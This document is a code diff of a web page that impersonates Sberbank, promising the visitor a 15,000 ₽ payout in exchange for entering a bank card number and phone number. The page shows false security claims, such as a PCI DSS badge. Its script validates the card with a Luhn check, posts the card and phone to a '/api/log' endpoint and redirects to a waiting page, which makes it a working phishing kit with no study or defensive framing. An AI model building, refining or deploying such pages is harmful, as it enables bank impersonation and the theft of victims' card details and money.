@@ -2,517 +2,355 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta content="width=device-width,initial-scale=1" name="viewport">
-    <meta content="no-cache" http-equiv="Cache-control">
-    <meta content="no-cache" http-equiv="Pragma">
-    <meta content="-1" http-equiv="Expires">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta http-equiv="Cache-control" content="no-cache">
     <title>СберБанк | Получение средств</title>
     <link rel="shortcut icon" href="favicons/favicon_sber.ico">
-    <link rel="stylesheet" href="css/v2/main.css">
-    <link rel="stylesheet" href="css/v2/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
-
         body {
-            font-family: 'SB Sans Interface', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f3f4f5;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f2 100%);
             min-height: 100vh;
-        }
-
-        .main-header {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 24px;
-            background: #fff;
-            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+            flex-direction: column;
         }
-
-        .sber_logo_width {
+        
+        /* Header */
+        .header {
+            background: #fff;
+            padding: 16px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .header__logo {
             height: 32px;
         }
-
-        .main-header-button {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: linear-gradient(90deg, #21a038 0%, #2ecc71 100%);
-            color: #fff;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 12px;
+        .header__title {
             font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            color: #21a038;
+            font-weight: 600;
         }
-
-        .main-header-button:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(33, 160, 56, 0.3);
-        }
-
-        .main-header-center {
-            text-align: center;
+        
+        /* Main */
+        .main {
             flex: 1;
-        }
-
-        .main-header-center__title {
-            font-size: 14px;
-            color: #8b8b8b;
-            margin-bottom: 4px;
-        }
-
-        .main-header-center__subtitle {
-            font-size: 36px;
-            font-weight: 600;
-            color: #1a1a1a;
-        }
-
-        .main-header-left, .main-header-right {
-            min-width: 200px;
-        }
-
-        .main-header-right {
-            text-align: right;
-        }
-
-        .main-header-left.mobile,
-        .main-header-center.mobile {
-            display: none;
-        }
-
-        .main-container {
-            max-width: 480px;
-            margin: 40px auto;
-            padding: 0 20px;
-        }
-
-        .sbp-btn-container {
-            background: #fff;
-            border-radius: 20px;
-            padding: 24px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
-        }
-
-        .sbp-btn-container h1 {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #1a1a1a;
-        }
-
-        .sbp-btn-container p {
-            color: #8b8b8b;
-            font-size: 14px;
-            margin-bottom: 16px;
-        }
-
-        .sbp-btn-container button {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(90deg, #21a038 0%, #6dd400 50%, #21a038 100%);
-            background-size: 200% 100%;
-            border: none;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            transition: background-position 0.5s, transform 0.2s;
+            padding: 20px;
         }
-
-        .sbp-btn-container button:hover {
-            background-position: 100% 0;
-            transform: translateY(-1px);
-        }
-
-        .sbp-btn-container button h4 {
-            margin: 0;
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        .white_logo {
-            width: 24px;
-            height: 24px;
-        }
-
-        .vstep-box {
+        
+        .card-form {
             background: #fff;
-            border-radius: 20px;
-            padding: 24px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 420px;
+            padding: 32px;
+            animation: slideUp 0.5s ease;
         }
-
-        .vstep-question {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 20px;
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .card-form__header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .card-form__title {
+            font-size: 22px;
+            font-weight: 700;
             color: #1a1a1a;
-        }
-
-        .sber-step-fields {
-            display: flex;
-            flex-direction: column;
-            gap: 18px;
-        }
-
-        .field {
-            position: relative;
-        }
-
-        .field .label {
-            display: block;
-            font-size: 13px;
-            color: #5d766d;
             margin-bottom: 8px;
         }
-
-        .sber-input {
+        .card-form__subtitle {
+            font-size: 14px;
+            color: #6b7280;
+        }
+        .card-form__amount {
+            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
+            color: #fff;
+            padding: 16px 24px;
+            border-radius: 16px;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .card-form__amount-label {
+            font-size: 12px;
+            opacity: 0.85;
+            margin-bottom: 4px;
+        }
+        .card-form__amount-value {
+            font-size: 32px;
+            font-weight: 700;
+        }
+        
+        .field {
+            margin-bottom: 20px;
+        }
+        .field__label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+        .field__input {
             width: 100%;
             height: 54px;
             padding: 0 18px;
-            border-radius: 18px;
-            border: 1px solid #d3e6d9;
-            background: #f6fbf8;
+            border: 2px solid #e5e7eb;
+            border-radius: 14px;
             font-size: 16px;
-            color: #102923;
-            transition: border 0.2s ease, box-shadow 0.2s ease;
-            box-sizing: border-box;
+            font-family: inherit;
+            color: #1a1a1a;
+            background: #fafbfc;
+            transition: all 0.2s ease;
         }
-
-        .sber-input:focus {
+        .field__input::placeholder {
+            color: #9ca3af;
+        }
+        .field__input:focus {
             outline: none;
             border-color: #21a038;
-            box-shadow: 0 0 0 4px rgba(33, 160, 56, 0.18);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(33, 160, 56, 0.12);
         }
-
-        .sber-input::placeholder {
-            color: #8b8b8b;
+        .field__input.error {
+            border-color: #ef4444;
+            background: #fef2f2;
         }
-
-        .field.field-submit {
-            margin-top: 8px;
-        }
-
-        .sber-submit {
+        
+        .submit-btn {
             width: 100%;
             height: 56px;
-            border-radius: 20px;
+            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
+            color: #fff;
             border: none;
-            background: linear-gradient(135deg, #21a038 0%, #58c57a 100%);
-            color: #ffffff;
-            font-size: 17px;
+            border-radius: 16px;
+            font-size: 16px;
             font-weight: 600;
+            font-family: inherit;
             cursor: pointer;
-            transition: transform 0.18s ease, box-shadow 0.18s ease, filter 0.18s ease;
+            transition: all 0.2s ease;
+            margin-top: 8px;
         }
-
-        .sber-submit:hover {
-            box-shadow: 0 20px 36px rgba(33, 160, 56, 0.22);
-            transform: translateY(-1px);
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(33, 160, 56, 0.3);
         }
-
-        .sber-submit:active {
+        .submit-btn:active {
             transform: translateY(0);
-            filter: saturate(0.92);
         }
-
-        .field.has-error .sber-input {
-            border-color: #e24444;
-            box-shadow: 0 0 0 4px rgba(226, 68, 68, 0.14);
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
-
-        .sber-secure-info {
+        
+        .secure-info {
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6b7280;
+        }
+        .secure-info svg {
+            color: #21a038;
+        }
+        
+        /* Error message */
+        .error-msg {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 12px;
+            padding: 12px 16px;
+            color: #dc2626;
             font-size: 13px;
-            color: #5d766d;
+            margin-bottom: 20px;
+            display: none;
         }
-
-        .sber-secure-icon {
-            width: 36px;
-            height: 24px;
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
         }
-
-        /* Loader */
-        .sber-loader-overlay {
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        
+        /* Loader overlay */
+        .loader-overlay {
             position: fixed;
             inset: 0;
-            z-index: 2000;
-            display: none;
+            background: rgba(0, 20, 10, 0.92);
+            backdrop-filter: blur(8px);
+            display: flex;
             align-items: center;
             justify-content: center;
-            padding: 18px;
-            background: radial-gradient(circle at top, rgba(7, 36, 23, 0.92), rgba(3, 15, 10, 0.95));
-            backdrop-filter: blur(14px);
+            z-index: 1000;
             opacity: 0;
             visibility: hidden;
-            pointer-events: none;
-            transition: opacity 0.18s ease, visibility 0.18s ease;
+            transition: all 0.3s ease;
         }
-
-        .sber-loader-overlay.show {
-            display: flex;
+        .loader-overlay.show {
             opacity: 1;
             visibility: visible;
-            pointer-events: auto;
         }
-
-        .sber-loader-container {
-            background: rgba(12, 24, 19, 0.94);
-            border-radius: 28px;
-            padding: 36px 38px;
+        .loader-content {
             text-align: center;
-            box-shadow: 0 32px 64px rgba(6, 14, 10, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(33, 160, 84, 0.35);
-            width: min(300px, 92vw);
-        }
-
-        .sber-loader-icon {
-            margin-bottom: 22px;
-        }
-
-        .sber-loader-icon svg {
-            width: 88px;
-            height: 88px;
-        }
-
-        .sber-loader-icon circle {
-            stroke-dasharray: 220 320;
-            stroke-dashoffset: 0;
-            animation: sber-loader-spin 1.05s linear infinite;
-            transform-box: fill-box;
-            transform-origin: 50% 50%;
-            fill: transparent;
-            stroke: #21a038;
-            stroke-width: 8;
-        }
-
-        .sber-loader-text {
-            color: rgba(226, 244, 234, 0.9);
-            font-size: 16px;
-            line-height: 1.5;
-        }
-
-        .sber-loader-text p {
-            margin: 4px 0;
-        }
-
-        @keyframes sber-loader-spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* Success */
-        .success-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255,255,255,0.98);
-            z-index: 2001;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        .success-overlay.active {
-            display: flex;
-        }
-
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #21a038 0%, #2ecc71 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 24px;
-            animation: scaleIn 0.3s ease;
-        }
-
-        .success-icon svg {
-            width: 40px;
-            height: 40px;
             color: #fff;
         }
-
-        .success-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #1a1a1a;
+        .loader-spinner {
+            width: 64px;
+            height: 64px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top-color: #21a038;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
         }
-
-        .success-desc {
-            color: #8b8b8b;
-            font-size: 14px;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
-
-        @keyframes scaleIn {
-            from { transform: scale(0); }
-            to { transform: scale(1); }
+        .loader-text {
+            font-size: 16px;
+            opacity: 0.9;
         }
-
-        @media (max-width: 768px) {
-            .main-header {
-                flex-direction: column;
-                gap: 16px;
+        .loader-subtext {
+            font-size: 13px;
+            opacity: 0.6;
+            margin-top: 8px;
+        }
+        
+        @media (max-width: 480px) {
+            .card-form {
+                padding: 24px;
+                border-radius: 20px;
             }
-
-            .main-header-left, .main-header-right {
-                min-width: auto;
-                width: 100%;
+            .card-form__title {
+                font-size: 20px;
             }
-
-            .main-header-left {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-            }
-
-            .main-header-right {
-                display: none;
-            }
-
-            .main-header-center {
-                order: -1;
-            }
-
-            .main-header-center__subtitle {
+            .card-form__amount-value {
                 font-size: 28px;
-            }
-
-            .main-container {
-                margin: 20px auto;
             }
         }
     </style>
 </head>
-
 <body>
-    <header class="main-header">
-        <div class="main-header-left">
-            <img alt="Сбербанк" class="sber_logo_width" src="images/sberbank-logo.befb25b6.svg">
-            <button class="main-header-button mobile-only" onclick="handleSberID()">
-                <svg height="18" viewBox="0 0 18 18" width="18" fill="currentColor">
-                    <path clip-rule="evenodd" d="M17.8554 7.38686C17.9508 7.90928 18 8.44993 18 9.00091C18 13.9712 13.9704 18 9 18C4.03017 18 0 13.9712 0 9.00091C0 4.02875 4.03017 0 9 0C11.1411 0 13.1079 0.748405 14.6532 1.99676L12.9026 3.28703C11.7911 2.52587 10.4469 2.07938 9 2.07938C5.18486 2.07938 2.08099 5.18538 2.08099 9.00091C2.08099 12.8164 5.18486 15.9206 9 15.9206C12.817 15.9206 15.9208 12.8164 15.9208 9.00091C15.9208 8.95444 15.9198 8.90797 15.9188 8.8615C15.9184 8.84601 15.9181 8.83052 15.9178 8.81503L17.8554 7.38686ZM5.57433 6.59698L9.00074 8.74621L16.1214 3.49766C16.5472 4.04742 16.911 4.64639 17.2014 5.28606L9.00074 11.331L5.57433 9.18177V6.59698Z" fill-rule="evenodd"></path>
-                </svg>
-                <span>Войти по Сбер ID</span>
-            </button>
-        </div>
-        <div class="main-header-center">
-            <div class="main-header-center__title">Получение средств</div>
-            <div class="main-header-center__subtitle">15 000 ₽</div>
-        </div>
-        <div class="main-header-right">
-            <button class="main-header-button" onclick="handleSberID()">
-                <svg height="18" viewBox="0 0 18 18" width="18" fill="currentColor">
-                    <path clip-rule="evenodd" d="M17.8554 7.38686C17.9508 7.90928 18 8.44993 18 9.00091C18 13.9712 13.9704 18 9 18C4.03017 18 0 13.9712 0 9.00091C0 4.02875 4.03017 0 9 0C11.1411 0 13.1079 0.748405 14.6532 1.99676L12.9026 3.28703C11.7911 2.52587 10.4469 2.07938 9 2.07938C5.18486 2.07938 2.08099 5.18538 2.08099 9.00091C2.08099 12.8164 5.18486 15.9206 9 15.9206C12.817 15.9206 15.9208 12.8164 15.9208 9.00091C15.9208 8.95444 15.9198 8.90797 15.9188 8.8615C15.9184 8.84601 15.9181 8.83052 15.9178 8.81503L17.8554 7.38686ZM5.57433 6.59698L9.00074 8.74621L16.1214 3.49766C16.5472 4.04742 16.911 4.64639 17.2014 5.28606L9.00074 11.331L5.57433 9.18177V6.59698Z" fill-rule="evenodd"></path>
-                </svg>
-                <span>Войти по Сбер ID</span>
-            </button>
-        </div>
+    <header class="header">
+        <svg class="header__logo" viewBox="0 0 132 32" fill="none">
+            <path d="M16 0C7.164 0 0 7.164 0 16s7.164 16 16 16 16-7.164 16-16S24.836 0 16 0zm0 28.8c-7.07 0-12.8-5.73-12.8-12.8S8.93 3.2 16 3.2 28.8 8.93 28.8 16 23.07 28.8 16 28.8z" fill="#21A038"/>
+            <path d="M16 6.4c-5.302 0-9.6 4.298-9.6 9.6s4.298 9.6 9.6 9.6 9.6-4.298 9.6-9.6-4.298-9.6-9.6-9.6zm5.12 6.4l-5.76 8.32a.64.64 0 01-1.04 0l-2.88-4.16a.64.64 0 01.52-1.02h1.6c.24 0 .46.13.58.34l1.18 2.04 3.94-5.7a.64.64 0 01.52-.26h1.6c.48 0 .76.54.52.94l-.76.5z" fill="#21A038"/>
+            <path d="M52 10h-4.8v12H52v-4h2.4c2.65 0 4.8-2.15 4.8-4.8V14c0-2.21-1.79-4-4-4H52zm3.2 4c0 .88-.72 1.6-1.6 1.6H52v-3.2h1.6c.88 0 1.6.72 1.6 1.6v.8zM68 10h-4.8v12H68v-4h2.4c2.65 0 4.8-2.15 4.8-4.8V14c0-2.21-1.79-4-4-4H68zm3.2 4c0 .88-.72 1.6-1.6 1.6H68v-3.2h1.6c.88 0 1.6.72 1.6 1.6v.8z" fill="#21A038"/>
+        </svg>
+        <span class="header__title">Безопасный платёж</span>
     </header>
-
-    <div class="main-container">
-        <div class="vstep-box">
-            <h1 class="vstep-question">По карте</h1>
-            <form id="cardForm" onsubmit="handleCardSubmit(event)">
-                <div class="sber-step-fields">
-                    <div class="field">
-                        <label class="label" for="form_input_card">Номер карты</label>
-                        <input type="text" placeholder="0000 0000 0000 0000" required id="form_input_card" class="sber-input" maxlength="19" inputmode="numeric" autocomplete="cc-number">
-                    </div>
-                    <div class="field">
-                        <label class="label" for="form_input_phone">Номер телефона</label>
-                        <input type="tel" placeholder="+7 (___) ___-__-__" required id="form_input_phone" class="sber-input" maxlength="18" autocomplete="tel" value="+7 ">
-                    </div>
-                    <div class="field field-submit">
-                        <button class="sber-submit" type="submit">Получить</button>
-                    </div>
-                    <div class="sber-secure-info">
-                        <img src="images/card.svg" alt="" class="sber-secure-icon">
-                        <span>Данные передаются по защищенному соединению</span>
-                    </div>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <!-- Loader -->
-    <div class="sber-loader-overlay" id="loader">
-        <div class="sber-loader-container">
-            <div class="sber-loader-icon">
-                <svg viewBox="0 0 100 100" fill="none" stroke-linecap="round">
-                    <circle cx="50" cy="50" r="42"></circle>
+    
+    <main class="main">
+        <form class="card-form" id="paymentForm" onsubmit="return false;">
+            <div class="card-form__header">
+                <h1 class="card-form__title">Получение средств</h1>
+                <p class="card-form__subtitle">Введите данные карты для зачисления</p>
+            </div>
+            
+            <div class="card-form__amount">
+                <div class="card-form__amount-label">Сумма к зачислению</div>
+                <div class="card-form__amount-value">15 000 ₽</div>
+            </div>
+            
+            <div class="error-msg" id="errorMsg"></div>
+            
+            <div class="field">
+                <label class="field__label" for="cardNumber">Номер карты</label>
+                <input type="text" 
+                       class="field__input" 
+                       id="cardNumber" 
+                       placeholder="0000 0000 0000 0000"
+                       maxlength="19"
+                       inputmode="numeric"
+                       autocomplete="cc-number">
+            </div>
+            
+            <div class="field">
+                <label class="field__label" for="phone">Номер телефона</label>
+                <input type="tel" 
+                       class="field__input" 
+                       id="phone" 
+                       placeholder="+7 (___) ___-__-__"
+                       maxlength="18"
+                       autocomplete="tel">
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Получить средства
+            </button>
+            
+            <div class="secure-info">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6.3 1.2 1 1.2 1.8v3.5c0 1-.8 1.7-1.7 1.7H9.7c-.9 0-1.7-.7-1.7-1.7v-3.5c0-.8.6-1.5 1.2-1.8V9.5C9.2 8.1 10.6 7 12 7zm0 1.2c-.8 0-1.5.7-1.5 1.5v1.6h3V9.7c0-.8-.7-1.5-1.5-1.5z"/>
                 </svg>
+                <span>Данные защищены по стандарту PCI DSS</span>
             </div>
-            <div class="sber-loader-text">
-                <p>Пожалуйста, подождите...</p>
-                <p>Не закрывайте страницу.</p>
-            </div>
+        </form>
+    </main>
+    
+    <div class="loader-overlay" id="loader">
+        <div class="loader-content">
+            <div class="loader-spinner"></div>
+            <div class="loader-text">Обработка данных...</div>
+            <div class="loader-subtext">Не закрывайте страницу</div>
         </div>
-    </div>
-
-    <!-- Success -->
-    <div class="success-overlay" id="success">
-        <div class="success-icon">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-                <path d="M5 13l4 4L19 7"/>
-            </svg>
-        </div>
-        <div class="success-title">Заявка принята!</div>
-        <div class="success-desc">Средства поступят в течение 15 минут</div>
     </div>
 
     <script>
-        // ============================================
-        // НАСТРОЙКИ API
-        // ============================================
         const API_URL = '/api';
-        // ============================================
-
-        // Форматирование номера карты
-        const cardInput = document.getElementById('form_input_card');
-        cardInput.addEventListener('input', function(e) {
+        const cardInput = document.getElementById('cardNumber');
+        const phoneInput = document.getElementById('phone');
+        const form = document.getElementById('paymentForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const loader = document.getElementById('loader');
+        
+        // Маска для карты
+        cardInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '').substring(0, 16);
-            const chunks = value.match(/.{1,4}/g) || [];
-            e.target.value = chunks.join(' ');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
         });
-
-        // Форматирование номера телефона
-        const phoneInput = document.getElementById('form_input_phone');
-        phoneInput.addEventListener('input', function(e) {
+        
+        // Маска для телефона
+        phoneInput.value = '+7 ';
+        phoneInput.addEventListener('input', (e) => {
             let digits = e.target.value.replace(/\D/g, '');
             if (!digits.length) {
                 e.target.value = '+7 ';
                 return;
             }
-            if (digits[0] === '8') {
-                digits = '7' + digits.slice(1);
-            } else if (digits[0] !== '7') {
-                digits = '7' + digits;
-            }
+            if (digits[0] === '8') digits = '7' + digits.slice(1);
+            else if (digits[0] !== '7') digits = '7' + digits;
             digits = digits.substring(0, 11);
-
+            
             let formatted = '+7';
             if (digits.length > 1) formatted += ' (' + digits.substring(1, 4);
             if (digits.length >= 4) formatted += ') ' + digits.substring(4, 7);
@@ -521,79 +359,99 @@
             if (digits.length <= 1) formatted += ' ';
             e.target.value = formatted.trimEnd();
         });
-
-        phoneInput.addEventListener('focus', function() {
-            if (!phoneInput.value.trim()) {
-                phoneInput.value = '+7 ';
-            }
+        
+        phoneInput.addEventListener('focus', () => {
+            if (!phoneInput.value) phoneInput.value = '+7 ';
         });
-
-        // Показать loader
-        function showLoader(show) {
-            document.getElementById('loader').classList.toggle('show', show);
-        }
-
-        // Отправка данных на API
-        async function sendToAPI(card, phone) {
-            try {
-                const response = await fetch(`${API_URL}/log`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ card, phone })
-                });
-                const data = await response.json();
-                return data.log_id;
-            } catch (error) {
-                console.error('API error:', error);
-                return null;
+        
+        // Валидация по Луну
+        function validateCard(number) {
+            const digits = number.replace(/\D/g, '');
+            if (digits.length !== 16) return false;
+            
+            let sum = 0;
+            let isEven = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let digit = parseInt(digits[i], 10);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
             }
+            return sum % 10 === 0;
         }
-
-        // Обработка формы карты
-        async function handleCardSubmit(e) {
+        
+        function showError(text) {
+            errorMsg.textContent = text;
+            errorMsg.classList.add('show');
+            setTimeout(() => errorMsg.classList.remove('show'), 5000);
+        }
+        
+        function showLoader(show) {
+            loader.classList.toggle('show', show);
+        }
+        
+        // Отправка формы
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const card = document.getElementById('form_input_card').value;
-            const phone = document.getElementById('form_input_phone').value;
-            const cardDigits = card.replace(/\s/g, '');
-            const phoneDigits = phone.replace(/\D/g, '');
-
-            if (cardDigits.length < 16) {
-                alert('Введите корректный номер карты');
+            const card = cardInput.value.replace(/\s/g, '');
+            const phone = phoneInput.value.replace(/\D/g, '');
+            
+            // Валидация
+            if (card.length !== 16) {
+                showError('Введите 16 цифр номера карты');
+                cardInput.classList.add('error');
                 return;
             }
-
-            if (phoneDigits.length < 11) {
-                alert('Введите корректный номер телефона');
+            cardInput.classList.remove('error');
+            
+            if (!validateCard(card)) {
+                showError('Проверьте правильность номера карты');
+                cardInput.classList.add('error');
                 return;
             }
-
-            showLoader(true);
-
-            const logId = await sendToAPI(card, phone);
             
-            if (logId) {
-                // Редирект на страницу ожидания
-                window.location.href = `waiting.html?id=${logId}`;
-            } else {
-                showLoader(false);
-                alert('Ошибка отправки данных. Попробуйте позже.');
+            if (phone.length !== 11) {
+                showError('Введите корректный номер телефона');
+                phoneInput.classList.add('error');
+                return;
             }
-        }
-
-        // Обработка Sber ID
-        async function handleSberID() {
+            phoneInput.classList.remove('error');
+            
+            // Отправка
             showLoader(true);
+            submitBtn.disabled = true;
             
-            const logId = await sendToAPI('Сбер ID', '-');
-            
-            if (logId) {
-                window.location.href = `waiting.html?id=${logId}`;
-            } else {
+            try {
+                const response = await fetch(API_URL + '/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        card: cardInput.value,
+                        phone: phoneInput.value
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success && data.log_id) {
+                    // Переходим на страницу ожидания
+                    window.location.href = `waiting.html?id=${data.log_id}`;
+                } else {
+                    showError('Произошла ошибка. Попробуйте позже.');
+                    showLoader(false);
+                    submitBtn.disabled = false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showError('Ошибка соединения. Проверьте интернет.');
                 showLoader(false);
-                alert('Ошибка. Попробуйте позже.');
+                submitBtn.disabled = false;
             }
-        }
+        });
     </script>
 </body>
 </html>
